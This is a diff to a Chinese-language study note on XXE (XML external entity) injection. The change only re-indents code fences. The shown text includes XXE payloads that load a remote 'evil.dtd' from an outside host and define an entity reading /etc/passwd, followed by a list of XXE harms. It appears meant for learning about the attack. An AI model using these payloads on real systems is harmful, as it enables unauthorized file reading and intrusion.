@@ -21,29 +21,29 @@
 ```
 		b. 通过DTD文档引入外部DTD文档，再引入外部实体声明
 			XML内容：
-			```
+```
 			<?xml version="1.0"?>
 			<!DOCTYPE a SYSTEM "http://mark4z5.com/evil.dtd">
 			<c>&b;</c>
-			```
+```
 			DTD文件内容：
-			```
+```
 			<!ENTITY b SYSTEM "file:///etc/passwd">
-			```
+```
 		c. 通过DTD外部实体声明引入外部实体声明
 			XML内容：
-			```
+```
 			<?xml version="1.0"?>
 			<!DOCTYPE a [
 				<!ENTITY % d SYSTEM "http://mark4z5.com/evil.dtd">
 				%d;
 			]>
 			<c>&b;</c>
-			```
+```
 			DTD文件内容：
-			```
+```
 			<!ENTITY b SYSTEM "file:///etc/passwd">
-			```
+```
 	3) XXE危害
 		a. 任意文件读取
 		b. 执行系统命令
